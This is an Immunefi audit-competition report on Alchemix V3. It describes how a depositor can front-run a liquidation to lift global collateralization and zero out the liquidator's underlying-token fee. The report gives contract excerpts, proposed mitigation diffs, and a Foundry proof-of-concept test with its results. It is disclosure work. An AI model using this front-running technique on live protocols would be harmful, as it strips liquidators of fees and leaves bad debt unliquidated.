# 58762 sc insight manipulation of feeinunderlying through front running during liquidations on ethereum

**Submitted on Nov 4th 2025 at 12:15:35 UTC by @sol\_4th05 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58762
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Permanent freezing of unclaimed royalties

## Description

## Brief/Intro

During the liquidation process on the Ethereum blockchain in case `alchemistCurrentCollateralization < globalMinimumCollateralization` the `feeInUnderlying` value can be manipulated (reduced to 0) by an attacker at no costs just paying transaction gas fee. This way the attacker prevent the user who started the liquidation process from receiving its `feeInUnderlying` for that liquidation.

## Vulnerability Details

When all the conditions are met and a user calls the function `AlchemistV3::Liquidate`, it calls in turn these functions to liquidate a position `_liquidate, _doLiquidation, calculateLiquidation`. Considering the latter, it returns among the others the following value: `outsourcedFee`. Then that value is used for the calculation of the `feeInUnderlying` that is sent to the user.

```solidity
function _doLiquidation(uint256 accountId, uint256 collateralInUnderlying, uint256 repaidAmountInYield)
        internal
        returns (uint256 amountLiquidated, uint256 feeInYield, uint256 feeInUnderlying)
    {
        Account storage account = _accounts[accountId];

@>      (uint256 liquidationAmount, uint256 debtToBurn, uint256 baseFee, uint256 outsourcedFee) = calculateLiquidation(
            collateralInUnderlying,
            account.debt,
@>          minimumCollateralization,
@>          normalizeUnderlyingTokensToDebt(_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt,
@>          globalMinimumCollateralization,
            liquidatorFee
        );
                    .
                    .
                    .

        // Handle outsourced fee from vault
        if (outsourcedFee > 0) {
            uint256 vaultBalance = IFeeVault(alchemistFeeVault).totalDeposits();
            if (vaultBalance > 0) {
@>              uint256 feeBonus = normalizeDebtTokensToUnderlying(outsourcedFee);
@>              feeInUnderlying = vaultBalance > feeBonus ? feeBonus : vaultBalance;
@>              IFeeVault(alchemistFeeVault).withdraw(msg.sender, feeInUnderlying);
            }
        }

        emit Liquidated(accountId, msg.sender, amountLiquidated + repaidAmountInYield, feeInYield, feeInUnderlying);
        return (amountLiquidated + repaidAmountInYield, feeInYield, feeInUnderlying);
    }
```

The `alchemistCurrentCollateralization` is a parameter given to the function `AlchemistV3::calculateLiquidation`.

`alchemistCurrentCollateralization = (_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt`

However, looking inside the function `AlchemistV3::calculateLiquidation`, the value above is used in order to determine whether `outsourcedFee = (debt * feeBps) / BPS;` or it will be 0 otherwise.

```solidity
function calculateLiquidation(
        uint256 collateral,
        uint256 debt,
        uint256 targetCollateralization,
        uint256 alchemistCurrentCollateralization,
        uint256 alchemistMinimumCollateralization,
        uint256 feeBps
    ) public pure returns (uint256 grossCollateralToSeize, uint256 debtToBurn, uint256 fee, uint256 outsourcedFee) {
              .
              .
              .

@>      if (alchemistCurrentCollateralization < alchemistMinimumCollateralization) {
            outsourcedFee = (debt * feeBps) / BPS;
            // fully liquidate debt in high ltv global environment
            return (debt, debt, 0, outsourcedFee);
        }
              .
              .
              .
    }
```

Thus, it is possible for an attacker to front-run liquidations of positions being in this specific condition.

* `collateralizationRatio <= collateralizationLowerBound`
* `alchemistCurrentCollateralization < globalMinimumCollateralization`
* `collateral > debt`

For these positions, the attacker can front-run the liquidation transaction depositing additional `myt` tokens. The attacker can front-run liquidations depositing an amount of `myt` increasing the `_mytSharesDeposited` value so that `alchemistCurrentCollateralization >= globalMinimumCollateralization`.

```solidity
    function _getTotalUnderlyingValue() internal view returns (uint256 totalUnderlyingValue) {
@>      uint256 yieldTokenTVLInUnderlying = convertYieldTokensToUnderlying(_mytSharesDeposited);
        totalUnderlyingValue = yieldTokenTVLInUnderlying;
    }
```

By doing this simple front run action, the attacker can set the value of `feeInUnderlying` to 0.

## Impact Details

Due to this attack the user starting the liquidation process will not get any `feeInUnderlying` even if it should have been `>0`.

The impact of the attack is twofold:

From one hand the `feeInUnderlying` that should have gone to the user it is reset by the attacker and on the other hand the protocol can't incentivize users to make liquidations with the `feeInUnderlying` as yield running this way the risk to leave `active` bad debt positions for a long time.

The amount of the `feeInUnderlying` as yield lost by the users, varies depending on what is the value of `feeBps` and the value of the `debt`. However, it should always be relevant and never negligible because of the reason explained before.

## References

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L862>

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L1239>

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L1258-L1262>

## Mitigation

A possible mitigation action could be the one below:

```diff
   function _getTotalUnderlyingValue() internal view returns (uint256 totalUnderlyingValue) {
+      if(lastupdate_mytSharesDeposited == block.number)
+       {
+       _mytSharesToConsider = old_mytSharesDeposited;    
+       } else {
+       _mytSharesToConsider = _mytSharesDeposited;    
+       }
+       uint256 yieldTokenTVLInUnderlying = convertYieldTokensToUnderlying(_mytSharesToConsider);
+       totalUnderlyingValue = yieldTokenTVLInUnderlying;
    }
```

```diff
    function deposit(uint256 amount, address recipient, uint256 tokenId) external returns (uint256) {
                 .
                 .
                 .

        // Transfer tokens from msg.sender now that the internal storage updates have been committed.
        TokenUtils.safeTransferFrom(myt, msg.sender, address(this), amount);
        
+       old_mytSharesDeposited = _mytSharesDeposited;
        _mytSharesDeposited += amount;
+       lastupdate_mytSharesDeposited = block.number; 
        
        emit Deposit(amount, tokenId);

        return convertYieldTokensToDebt(amount);
    }
```

```diff
function withdraw(uint256 amount, address recipient, uint256 tokenId) external returns (uint256) {
             .
             .
             .

        // Transfer the yield tokens to msg.sender
        TokenUtils.safeTransfer(myt, recipient, amount);

+       old_mytSharesDeposited = _mytSharesDeposited;
        _mytSharesDeposited -= amount;
+       lastupdate_mytSharesDeposited = block.number; 

        emit Withdraw(amount, tokenId, recipient);

        return amount;
    }
```

```diff
function burn(uint256 amount, uint256 recipientId) external returns (uint256) {
              .
              .
              .
        // Debt is subject to protocol fee similar to redemptions
        _accounts[recipientId].collateralBalance -= convertDebtTokensToYield(credit) * protocolFee / BPS;
        TokenUtils.safeTransfer(myt, protocolFeeReceiver, convertDebtTokensToYield(credit) * protocolFee / BPS);
+       old_mytSharesDeposited = _mytSharesDeposited;        
        _mytSharesDeposited -= convertDebtTokensToYield(credit) * protocolFee / BPS;
+       lastupdate_mytSharesDeposited = block.number; 
        
        // Update the recipient's debt.
        _subDebt(recipientId, credit);

        totalSyntheticsIssued -= credit;

        emit Burn(msg.sender, credit, recipientId);

        return credit;
    }
```

```diff
  function repay(uint256 amount, uint256 recipientTokenId) public returns (uint256) {
             .
             .
             .

        // Transfer the repaid tokens to the transmuter.
        TokenUtils.safeTransferFrom(myt, msg.sender, transmuter, creditToYield);
        TokenUtils.safeTransfer(myt, protocolFeeReceiver, creditToYield * protocolFee / BPS);
+       old_mytSharesDeposited = _mytSharesDeposited;           
        _mytSharesDeposited -= creditToYield * protocolFee / BPS;
+       lastupdate_mytSharesDeposited = block.number; 

        emit Repay(msg.sender, amount, recipientTokenId, creditToYield);

        return creditToYield;
    }
```

```diff
function redeem(uint256 amount) external onlyTransmuter {
          .
          .
          .

        TokenUtils.safeTransfer(myt, transmuter, collRedeemed);
        TokenUtils.safeTransfer(myt, protocolFeeReceiver, feeCollateral);
+       old_mytSharesDeposited = _mytSharesDeposited;        
        _mytSharesDeposited -= collRedeemed + feeCollateral;
+       lastupdate_mytSharesDeposited = block.number; 
        emit Redemption(redeemedDebtTotal);
    }
```

## Link to Proof of Concept

<https://gist.github.com/0x4th05/dc0e99b72696e2e3a579d5e27d21b170>

## Proof of Concept

## Proof of Concept

Add the following test to the test suite (AlchemistV3.t.sol) of the project, and run this: `forge test --mt testManipulationUnderlyingFeeInLiquidations -vvvvv` and it should pass

```solidity
 // SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.28;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";
import {MockMYTStrategy} from "./mocks/MockMYTStrategy.sol";
import {MYTTestHelper} from "./libraries/MYTTestHelper.sol";
import {IMYTStrategy} from "../interfaces/IMYTStrategy.sol";
import {MockAlchemistAllocator} from "./mocks/MockAlchemistAllocator.sol";
import {IMockYieldToken} from "./mocks/MockYieldToken.sol";
import {IVaultV2} from "../../lib/vault-v2/src/interfaces/IVaultV2.sol";
import {VaultV2} from "../../lib/vault-v2/src/VaultV2.sol";
import {MockYieldToken} from "./mocks/MockYieldToken.sol";

contract AlchemistV3Test is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public constant BPS = 10_000;

    uint256 public protocolFee = 100;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds;

    // large amount to test with
    uint256 whaleSupply;

    // amount of yield/underlying token to deposit
    uint256 depositAmount;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 10e18;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    // WETH address
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public protocolFeeReceiver = address(10);

    // MYT variables
    VaultV2 vault;
    MockAlchemistAllocator allocator;
    MockMYTStrategy mytStrategy;
    address public operator = address(0x2222222222222222222222222222222222222222); // default operator
    address public admin = address(0x4444444444444444444444444444444444444444); // DAO OSX
    address public curator = address(0x8888888888888888888888888888888888888888);
    address public mockVaultCollateral = address(new TestERC20(100e18, uint8(18)));
    address public mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
    uint256 public defaultStrategyAbsoluteCap = 2_000_000_000e18;
    uint256 public defaultStrategyRelativeCap = 1e18; // 100%

    struct CalculateLiquidationResult {
        uint256 liquidationAmountInYield;
        uint256 debtToBurn;
        uint256 outSourcedFee;
        uint256 baseFeeInYield;
    }

    struct AccountPosition {
        address user;
        uint256 collateral;
        uint256 debt;
        uint256 tokenId;
    }

    function setUp() external {
        adJustTestFunds(18);
        setUpMYT(18);
        deployCoreContracts(18);
    }

    function adJustTestFunds(uint256 alchemistUnderlyingTokenDecimals) public {
        accountFunds = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
        whaleSupply = 20_000_000_000 * 10 ** alchemistUnderlyingTokenDecimals;
        depositAmount = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
    }

    function setUpMYT(uint256 alchemistUnderlyingTokenDecimals) public {
        vm.startPrank(admin);
        uint256 TOKEN_AMOUNT = 1_000_000; // Base token amount
        uint256 initialSupply = TOKEN_AMOUNT * 10 ** alchemistUnderlyingTokenDecimals;
        mockVaultCollateral = address(new TestERC20(initialSupply, uint8(alchemistUnderlyingTokenDecimals)));
        mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
        vault = MYTTestHelper._setupVault(mockVaultCollateral, admin, curator);
        mytStrategy = MYTTestHelper._setupStrategy(address(vault), mockStrategyYieldToken, admin, "MockToken", "MockTokenProtocol", IMYTStrategy.RiskClass.LOW);
        allocator = new MockAlchemistAllocator(address(vault), admin, operator);
        vm.stopPrank();
        vm.startPrank(curator);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        vault.setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, address(mytStrategy)));
        vault.addAdapter(address(mytStrategy));
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (idData, defaultStrategyAbsoluteCap)));
        vault.increaseAbsoluteCap(idData, defaultStrategyAbsoluteCap);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseRelativeCap, (idData, defaultStrategyRelativeCap)));
        vault.increaseRelativeCap(idData, defaultStrategyRelativeCap);
        vm.stopPrank();
    }

    function _magicDepositToVault(address vault, address depositor, uint256 amount) internal returns (uint256) {
        deal(address(mockVaultCollateral), address(depositor), amount);
        vm.startPrank(depositor);
        TokenUtils.safeApprove(address(mockVaultCollateral), vault, amount);
        uint256 shares = IVaultV2(vault).deposit(amount, depositor);
        vm.stopPrank();
        return shares;
    }

    function _vaultSubmitAndFastForward(bytes memory data) internal {
        vault.submit(data);
        bytes4 selector = bytes4(data);
        vm.warp(block.timestamp + vault.timelock(selector));
    }

    function deployCoreContracts(uint256 alchemistUnderlyingTokenDecimals) public {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        // Fake tokens
        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: address(vault.asset()),
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            transmuter: address(transmuterLogic),
            protocolFee: 600, // set protocol fees to 6%
            protocolFeeReceiver: protocolFeeReceiver,
            liquidatorFee: liquidatorFeeBPS,
            repaymentFee: 100,
            myt: address(vault)
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);
        whitelist.add(yetAnotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(vault.asset()), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));

        _magicDepositToVault(address(vault), externalUser, 10e18*minimumCollateralization);
     
        vm.stopPrank();

        deal(address(vault.asset()), externalUser, 10e18*minimumCollateralization/1e18);
        deal(address(vault.asset()), anotherExternalUser, 100e18);
    }


  function testManipulationUnderlyingFeeInLiquidations() external {
        uint256 amountOfDebtToCreate = 10e18;
        uint256 amountToDeposit = 10e18* alchemist.minimumCollateralization()/1e18;
        uint256 amountToManipulateUnderlyingFee = amountToDeposit*12/10 - amountToDeposit;
        deal(address(vault), externalUser, amountToDeposit);
        deal(address(vault), anotherExternalUser, amountToManipulateUnderlyingFee);

        vm.startPrank(externalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), amountToDeposit);
        alchemist.deposit(amountToDeposit, externalUser, 0);
        // a single position nft would have been minted to an `externalUser1`
        uint256 tokenIdExternalUser = AlchemistNFTHelper.getFirstTokenId(externalUser, address(alchemistNFT));
        alchemist.mint(tokenIdExternalUser, amountOfDebtToCreate, externalUser);
        vm.roll(block.number + 1);
        (uint256 externalUserCollateral, uint256 externalUserDebt,) = alchemist.getCDP(tokenIdExternalUser);  
        vm.stopPrank();
        
        //Then considering the simpliest way with which a `debt` can become `underCollaterlized`
        //Changing the `minimumCollateralization` and the `globalMinimumCollateralization` values so that the account number 1 above become `undercollateralized` 
        vm.startPrank(alOwner);
        uint256 newGlobalMinimumCollateralization = alchemist.globalMinimumCollateralization() * 12 / 10;
        uint256 newMinimumCollateralization = alchemist.minimumCollateralization() * 11 / 10;
        alchemist.setCollateralizationLowerBound(alchemist.globalMinimumCollateralization());
        alchemist.setGlobalMinimumCollateralization(newGlobalMinimumCollateralization);
        alchemist.setMinimumCollateralization(newMinimumCollateralization);
        alchemist.setCollateralizationLowerBound(newMinimumCollateralization);
        //Now we are in the condition where `(debt < collateral && collateral < globalminimuncollateralization * debt)`
        (uint256 newExternalUserCollateral, uint256 newExternalUserDebt,) = alchemist.getCDP(tokenIdExternalUser); 
        vm.stopPrank();
        
        // `anotherExternalUser` front-run `yetAnotherExternalUser` with a deposit thus changing the `currentCollateralizationRatio` of `AlchemistV3`
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), amountToManipulateUnderlyingFee);
        alchemist.deposit(amountToManipulateUnderlyingFee, anotherExternalUser, 0);
        // a single position nft would have been minted to an `anotherExternalUser`
        uint256 tokenIdAnotherExternalUser = AlchemistNFTHelper.getFirstTokenId(anotherExternalUser, address(alchemistNFT));
        vm.stopPrank();
    
        deal(address(vault.asset()), address(alchemistFeeVault), 1e18);
     
        vm.startPrank(yetAnotherExternalUser);
        (uint256 yieldAmount, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(1);
        vm.stopPrank();
     
        vm.startPrank(anotherExternalUser);
        alchemist.withdraw(amountToManipulateUnderlyingFee, anotherExternalUser, tokenIdAnotherExternalUser);
        
        assertEq(feeInUnderlying, 0, "The fee has not been manipulated by the attacker");
        vm.stopPrank();    
  }
}
```

As an additional proof of the issue, you can run the same test (without the front-running action) noting that the `feeInUnderlying` value it's `!= 0` as it should always be.

`forge test --mt testUnderlyingFeeInLiquidationsWithoutManipulation -vvvvv`

```solidity
function testUnderlyingFeeInLiquidationsWithoutManipulation() external {
        uint256 amountOfDebtToCreate = 10e18;
        uint256 amountToDeposit = 10e18* alchemist.minimumCollateralization()/1e18;
        uint256 amountToManipulateUnderlyingFee = amountToDeposit*12/10 - amountToDeposit;
        deal(address(vault), externalUser, amountToDeposit);
        deal(address(vault), anotherExternalUser, amountToManipulateUnderlyingFee);

        vm.startPrank(externalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), amountToDeposit);
        alchemist.deposit(amountToDeposit, externalUser, 0);
        // a single position nft would have been minted to an `externalUser1`
        uint256 tokenIdExternalUser = AlchemistNFTHelper.getFirstTokenId(externalUser, address(alchemistNFT));
        alchemist.mint(tokenIdExternalUser, amountOfDebtToCreate, externalUser);
        vm.roll(block.number + 1);
        (uint256 externalUserCollateral, uint256 externalUserDebt,) = alchemist.getCDP(tokenIdExternalUser);  
        vm.stopPrank();
        
        //Then considering the simpliest way with which a `debt` can become `underCollaterlized`
        //Changing the `minimumCollateralization` and the `globalMinimumCollateralization` values so that the account number 1 above become `undercollateralized` 
        vm.startPrank(alOwner);
        uint256 newGlobalMinimumCollateralization = alchemist.globalMinimumCollateralization() * 12 / 10;
        uint256 newMinimumCollateralization = alchemist.minimumCollateralization() * 11 / 10;
        alchemist.setCollateralizationLowerBound(alchemist.globalMinimumCollateralization());
        alchemist.setGlobalMinimumCollateralization(newGlobalMinimumCollateralization);
        alchemist.setMinimumCollateralization(newMinimumCollateralization);
        alchemist.setCollateralizationLowerBound(newMinimumCollateralization);
        //Now we are in the condition where `(debt < collateral && collateral < globalminimuncollateralization * debt)`
        (uint256 newExternalUserCollateral, uint256 newExternalUserDebt,) = alchemist.getCDP(tokenIdExternalUser); 
        vm.stopPrank();
    
        deal(address(vault.asset()), address(alchemistFeeVault), 1e18);
     
        vm.startPrank(yetAnotherExternalUser);
        (uint256 yieldAmount, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(1);
        vm.stopPrank();

        assertEq(feeInUnderlying, 0, "The fee has not been manipulated by the attacker"); 
  }
```

The result of the 2 tests:

```
Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] testManipulationUnderlyingFeeInLiquidations() (gas: 2024145)
                     .
                     .
                     .
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 296.19ms (288.02ms CPU time)
Ran 1 test suite in 1.68s (296.19ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

```
Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[FAIL: The fee has not been manipulated by the attacker: 300000000000000000 != 0] testUnderlyingFeeInLiquidationsWithoutManipulation() (gas: 2023218)
               .
               .
               .
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 294.61ms (282.58ms CPU time)
Ran 1 test suite in 2.13s (294.61ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
Failing tests:
Encountered 1 failing test in src/test/AlchemistV3.t.sol:AlchemistV3Test
[FAIL: The fee has not been manipulated by the attacker: 300000000000000000 != 0] testUnderlyingFeeInLiquidationsWithoutManipulation() (gas: 2023218)
```
